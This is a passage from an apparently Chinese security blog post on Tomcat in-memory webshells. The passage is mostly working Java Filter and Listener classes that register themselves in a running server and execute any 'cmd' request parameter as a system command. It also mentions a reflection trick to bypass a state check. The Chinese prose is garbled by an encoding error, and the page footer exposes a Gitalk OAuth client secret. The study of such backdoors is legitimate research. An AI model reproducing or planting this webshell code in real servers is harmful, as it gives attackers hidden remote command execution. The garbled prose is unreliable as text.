(standardContext.findFilterDef(<span class="hljs-string">"p1ay2win"</span>) == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">            FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();</span><br><span class="line">            filterDef.setFilterName(<span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">            filterDef.setFilterClass(<span class="hljs-keyword">this</span>.getClass().getName());</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();</span><br><span class="line">            filterMap.setFilterName(<span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">            filterMap.addURLPattern(<span class="hljs-string">"/*"</span>);</span><br><span class="line">            standardContext.addFilterMap(filterMap);</span><br><span class="line">            standardContext.filterStart();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="hljs-string">"cmd /c "</span> + servletRequest.getParameter(<span class="hljs-string">"cmd"</span>));</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Listener</li>
</ul>
<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.JavaWebMemoryShell.exploit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListenerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ServletRequestListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ListenerDemo</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        <span class="hljs-keyword">if</span> (!Arrays.asList(standardContext.findApplicationListeners()).contains(<span class="hljs-keyword">this</span>.getClass().getName())) &#123;</span><br><span class="line">            standardContext.addApplicationListener(<span class="hljs-keyword">this</span>.getClass().getName());</span><br><span class="line">            standardContext.listenerStart();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (sre.getServletRequest().getParameter(<span class="hljs-string">"cmd"</span>) != <span class="hljs-keyword">null</span>)</span><br><span class="line">                Runtime.getRuntime().exec(sre.getServletRequest().getParameter(<span class="hljs-string">"cmd"</span>));</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å†…å­˜é©¬é™¤äº†ä½¿ç”¨StandardContextè‡ªå¸¦çš„æ–¹æ³•åŠ è½½ï¼Œè¿˜å¯ä½¿ç”¨ApplicationContextçš„<code>addServlt</code>ã€<code>addFilter</code>å’Œ<code>addListener</code>æ–¹æ³•åŠ è½½ï¼Œä½†ä¹‹æ‰€ä»¥å¾ˆå°‘äººä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œæ˜¯å› ä¸º<code>addXXX</code>æ–¹æ³•éƒ½æœ‰ä¸‹é¢è¿™æ®µä»£ç ï¼Œæ£€æµ‹è¿è¡ŒçŠ¶æ€ï¼Œä¸å…è®¸åˆå§‹åŒ–ååœ¨æ·»åŠ ç»„ä»¶ã€‚</p>
<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(</span><br><span class="line">            sm.getString(<span class="hljs-string">"applicationContext.addXXX.ise"</span>,</span><br><span class="line">                    getContextPath()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ—¢ç„¶æ˜¯å±æ€§ï¼Œè‚¯å®šæ˜¯èƒ½å¤Ÿé€šè¿‡åå°„çš„æ–¹æ³•ä¿®æ”¹å®ƒçš„å€¼ï¼Œç„¶åç»•è¿‡æ£€æµ‹çš„ï¼Œä½†æœ¬æ–‡å› ä¸ºç¯‡å¹…é—®é¢˜å°±ä¸ç»™å‡ºå®ç°ä»£ç äº†ï¼Œä¹Ÿå› ä¸ºæŒºç®€å•çš„ï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥è¯•è¯•ã€‚</p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è¿™é‡Œæ’ä¸ªé¢˜å¤–è¯ï¼Œè·Ÿä¸€ä¸ªå®‰å…¨ç ”ç©¶çš„å¸ˆå…„èŠå¤©çš„æ—¶å€™èŠåˆ°äº†å†…å­˜é©¬ï¼Œæˆ‘å‘ä»–è¯·æ•™è¯´ä¸ºä»€ä¹ˆè¯´æ˜¯å†…å­˜é©¬ï¼Œä½†Catalinaç›®å½•ä¸‹ä¼šç”Ÿæˆå†…å­˜é©¬çš„<code>.class</code>å’Œ<code>.java</code>æ–‡ä»¶ï¼Œä¸æ˜¯æ— æ–‡ä»¶è½åœ°å—ï¼Ÿè¿˜è·Ÿä»–æ¢è®¨äº†ä¸€é˜µå­ã€‚åæ¥ä»–æ„è¯†åˆ°æˆ‘æ˜¯é€šè¿‡è®¿é—®ä¸Šä¼ çš„jspç”Ÿæˆçš„å†…å­˜é©¬ï¼Œè€Œè®¿é—®jspæ–‡ä»¶æ—¶tomcatçš„æœºåˆ¶æ˜¯å…ˆä»Catalinaç›®å½•ä¸‹æ‰¾æ˜¯å¦å­˜åœ¨è¿™ä¸ªç±»ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¼šæ ¹æ®jspæ–‡ä»¶ç”ŸæˆHttpServletç±»å¹¶ç¼–è¯‘ï¼Œæ”¾åˆ°Catalinaç›®å½•ä¸‹ï¼Œæ‰€ä»¥åˆ é™¤ä¸Šä¼ çš„jspæ–‡ä»¶ï¼ŒCatalinaç›®å½•ä¸‹ç›¸åº”çš„å†…å®¹ä¹Ÿä¼šè¢«åˆ é™¤ï¼Œä½†çœŸæ­£æ„ä¹‰ä¸Šçš„æ— æ–‡ä»¶è¿˜æ˜¯é€šè¿‡ååºåˆ—åŒ–å®ç°ã€‚æƒ³æƒ³é—¹è¿™å‡ºç¬‘è¯ä¹Ÿæ˜¯6æœˆä»½çš„æ—¶å€™äº†ï¼Œæ„Ÿæ…¨æ—¶é—´è¿‡å¾—å¥½å¿«ã€‚ğŸ˜”</p>
<p>åŸæœ¬æ‰“ç®—åœ¨æ–‡ä¸­ä¹ŸåŠ ä¸ŠSpringå†…å­˜é©¬çš„å†…å®¹ï¼Œå¥ˆä½•Springçš„å¯åŠ¨æµç¨‹æ¯”Tomcatå¤æ‚å¤ªå¤šï¼ŒTomcatçš„è°ƒè¯•ä¹Ÿæå¾—æˆ‘å¤Ÿå‘›çš„äº†ï¼ŒSpringçš„å†…å®¹è¿˜æ˜¯ç•™åœ¨åç»­å†ç ”ç©¶å§ã€‚é€šè¿‡è¿™æ¬¡å­¦ä¹ ï¼Œæ„Ÿè§‰Javaå®‰å…¨è·Ÿä»£ç çš„ç›¸å…³æ€§å¾ˆå¼ºã€‚åŠ æ²¹å§ï¼Œéªšå¹´</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&amp;mid=2652991099&amp;idx=1&amp;sn=a6c34bb344f105eb98fc6943c7439331&amp;scene=21#wechat_redirect%EF%BC%88%EF%BC%89" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&amp;mid=2652991099&amp;idx=1&amp;sn=a6c34bb344f105eb98fc6943c7439331&amp;scene=21#wechat_redirect%EF%BC%88%EF%BC%89</a></p>
<p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/274466.html</a></p>
<p><a href="https://su18.org/post/memory-shell/" target="_blank" rel="noopener">https://su18.org/post/memory-shell/</a></p>
<p><a href="https://github.com/bitterzzZZ/MemoryShellLearn" target="_blank" rel="noopener">https://github.com/bitterzzZZ/MemoryShellLearn</a></p>
<p><a href="https://landgrey.me/blog/12/" target="_blank" rel="noopener">https://landgrey.me/blog/12/</a></p>
<p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/274466.html</a></p>
<p><a href="https://www.cnblogs.com/colin-xun/p/10573504.html" target="_blank" rel="noopener">https://www.cnblogs.com/colin-xun/p/10573504.html</a></p>
<p><a href="https://blog.csdn.net/lblblblblzdx/article/details/80946526" target="_blank" rel="noopener">https://blog.csdn.net/lblblblblzdx/article/details/80946526</a></p>

        </div>
        
            <ul class="post-copyright">
            <li><strong>æœ¬æ–‡æ ‡é¢˜ï¼š</strong><a href="http://127.0.0.1/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /">Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ </a></li>
            <li><strong>æœ¬æ–‡ä½œè€…ï¼š</strong><a href="http://127.0.0.1">P1ay2win</a></li>
            <li><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://127.0.0.1/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /">http://127.0.0.1/2021/09/27/Javaå†…å­˜é©¬åŠå…¶æœºåˆ¶å­¦ä¹ /</a></li>
            <li><strong>å‘å¸ƒæ—¶é—´ï¼š</strong>2021-09-27</li>
            <li><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
            </li>
            </ul>
        
        
        <div class="level is-size-7 is-uppercase">
            <div class="level-start">
                <div class="level-item">
                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
                    <a class="has-link-grey -link" href="/tags/å†…å­˜é©¬/">å†…å­˜é©¬</a>
                </div>
            </div>
        </div>
        
        
        
    </div>
</div>





<div class="card card-transparent">
    <div class="level post-navigation is-flex-wrap is-mobile">
        
        <div class="level-start">
            <a class="level level-item has-link-grey  article-nav-prev" href="/2021/10/20/Confluenceæ¨¡æ¿æ³¨å…¥ï¼ˆCVE-2020-4027ï¼‰å¤ç°/">
                <i class="level-item fas fa-chevron-left"></i>
                <span class="level-item">Confluenceæ¨¡æ¿æ³¨å…¥ï¼ˆCVE-2020-4027ï¼‰å¤ç°</span>
            </a>
        </div>
        
        
        <div class="level-end">
            <a class="level level-item has-link-grey  article-nav-next" href="/2021/09/14/æ²¡ä»€ä¹ˆå¥½åˆ†æçš„Shiro-550/">
                <span class="level-item">æ²¡ä»€ä¹ˆå¥½åˆ†æçš„Shiro-550</span>
                <i class="level-item fas fa-chevron-right"></i>
            </a>
        </div>
        
    </div>
</div>



<div class="card">
    <div class="card-content">
        <h3 class="title is-5 has-text-weight-normal">è¯„è®º</h3>
        
<div id="comment-container"></div>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
<script>
    var gitalk = new Gitalk({
        clientID: '372fb49f2243341bf93b',
        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
        id: '471820e150cecd281641b058d2851463',
        repo: 'p1ay2win.github.io',
        owner: 'p1ay2win',
        admin: "p1ay2win",
        createIssueManually: false,
        distractionFreeMode: false
    })
    gitalk.render('comment-container')
</script>


    </div>
</div>

</div>
                




<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
    
        
<div class="card widget">
    <div class="card-content">
        <nav class="level">
            <div class="level-item has-text-centered" style="flex-shrink: 1">
                <div>
                    
                    <figure class="image is-128x128 has-mb-6">
                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
                    </figure>
                    
                    <p class="is-size-4 is-block">
                        p1ay2win
                    </p>
                    
                    
                    <p class="is-size-6 is-block">
                        ä»–ä»¬çš„çˆ±ä¸é£åï¼Œåªé—®è‡ªç”±ï¼Œåªé—®ç››æ”¾ï¼Œåªé—®æ·±æƒ…ï¼Œåªé—®åˆå¿ƒï¼Œåªé—®å‹‡æ•¢ï¼Œæ— é—®è¥¿ä¸œã€‚
                    </p>
                    
                    
                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
                        <i class="fas fa-map-marker-alt has-mr-7"></i>
                        <span>CN</span>
                    </p>
                    
                </div>
            </div>
        </nav>
        <nav class="level is-mobile">
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        æ–‡ç« 
                    </p>
                    <p class="title has-text-weight-normal">
                        38
                    </p>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        åˆ†ç±»
                    </p>
                    <p class="title has-text-weight-normal">
                        7
                    </p>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        æ ‡ç­¾
                    </p>
                    <p class="title has-text-weight-normal">
                        35
                    </p>
                </div>
            </div>
        </nav>
        
        <div class="level">
            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
                å…³æ³¨æˆ‘</a>
        </div>
        
        
        
        <div class="level is-mobile">
            
            <a class="level-item button is-white is-marginless" target="_blank"
                title="Github" href="https://github.com/P1ay2win/">
                
                <i class="fab fa-github"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank"
                title="Twitter" href="https://twitter.com/p1ay2win">
                
                <i class="fab fa-twitter"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank"
                title="RSS" href="/atom.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
            
        </div>
        
    </div>
</div>

    
        

    <div class="card widget column-left is-sticky" id="toc">
        <div class="card-content">
            <div class="menu">
                <h3 class="menu-label">
                    ç›®å½•
                </h3>
                <ul class="menu-list"><li>
        <a class="is-flex" href="#å‰è¨€">
        <span class="has-mr-6">1</span>
        <span>å‰è¨€</span>
        </a></li><li>
        <a class="is-flex" href="#å‰ç½®çŸ¥è¯†">
        <span class="has-mr-6">2</span>
        <span>å‰ç½®çŸ¥è¯†</span>
        </a><ul class="menu-list"><li>
        <a class="is-flex" href="#Java-Webä¸‰å¤§ç»„ä»¶">
        <span class="has-mr-6">2.1</span>
        <span>Java Webä¸‰å¤§ç»„ä»¶</span>
        </a><ul class="menu-list"><li>
        <a class="is-flex" href="#Servlet">
        <span class="has-mr-6">2.1.1</span>
        <span>Servlet</span>
        </a></li><li>
        <a class="is-flex" href="#Filter">
        <span class="has-mr-6">2.1.2</span>
        <span>Filter</span>
        </a></li><li>
        <a class="is-flex" href="#Listener">
        <span class="has-mr-6">2.1.3</span>
        <span>Listener</span>
        </a></li></ul></li><li>
        <a class="is-flex" href="#ä¸¤ç§ä¸Šä¸‹æ–‡">
        <span class="has-mr-6">2.2</span>
        <span>ä¸¤ç§ä¸Šä¸‹æ–‡</span>
        </a></li></ul></li><li>
        <a class="is-flex" href="#web-xmlåŠ è½½å’ŒTomcatå¯åŠ¨æµç¨‹è°ƒè¯•">
        <span class="has-mr-6">3</span>
        <span>web.xmlåŠ è½½å’ŒTomcatå¯åŠ¨æµç¨‹è°ƒè¯•</span>
        </a><ul class="menu-list"><li>
        <a class="is-flex" href="#å°ç»“">
        <span class="has-mr-6">3.1</span>
        <span>å°ç»“</span>
        </a></li></ul></li><li>
        <a class="is-flex" href="#ä¸‰ç§å†…å­˜é©¬å®ç°">
        <span class="has-mr-6">4</span>
        <span>ä¸‰ç§å†…å­˜é©¬å®ç°</span>
        </a></li><li>
        <a class="is-flex" href="#åè®°">
        <span class="has-mr-6">5</span>
        <span>åè®°</span>
        </a></li><li>
        <a class="is-flex" href="#å‚è€ƒ">
        <span class="has-mr-6">6</span>
        <span>å‚è€ƒ</span>
        </a></li></ul>
            </div>
        </div>
    </div>


    
    
        <div class="column-right-shadow is-hidden-widescreen ">
        
        </div>
    
</div>


                

            </div>
        </div>
    </section>
    <footer class="footer">
    <div class="container">
        <div class="level">
            <div class="level-start has-text-centered-mobile">
                <a class="footer-logo is-block has-mb-6" href="/">
                
                    P1ay2win&#39;s blog
                
                </a>
                <p class="is-size-7">
                &copy; 2022 P1ay2win&nbsp;
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡  <i class="fa fa-user-md"></i>  è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº<br>
                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
                
                </p>
            </div>
            <div class="level-end">
            
                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
                        
                        <i class="fab fa-creative-commons"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
                        
                        <i class="fab fa-creative-commons-by"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
                        
                        <i class="fab fa-github"></i>
                        
                    </a>
                </p>
                
                </div>
            
            </div>
        </div>
    </div>
</footer>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
<script>moment.locale("zh-CN");</script>

<script>
var IcarusThemeSettings = {
    article: {
        highlight: {
            clipboard: true,
            fold: 'unfolded'
        }
    }
};
</script>


    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>



    
    
<script src="/js/animation.js"></script>

    
    
<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
<script src="/js/gallery.js" defer></script>

    
    
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
            my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        });
    });
</script>

    
    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    MathJax.Hub.Config({
        'HTML-CSS': {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
});
</script>
    
    
<a id="back-to-top" title="å›åˆ°é¡¶ç«¯" href="javascript:;">
    <i class="fas fa-chevron-up"></i>
</a>
<script src="/js/back-to-top.js" defer></script>

    
    
    
    
    
    
    
    
    
    
    


<script src="/js/main.js" defer></script>

    
    <div class="searchbox ins-search">
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'æ–‡ç« ',
                PAGES: 'é¡µé¢',
                CATEGORIES: 'åˆ†ç±»',
                TAGS: 'æ ‡ç­¾',
                UNTITLED: '(æ— æ ‡é¢˜)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script src="/js/insight.js" defer></script>
<link rel="stylesheet" href="/css/search.css">
<link rel="stylesheet" href="/css/insight.css">
    
</body>
</html>
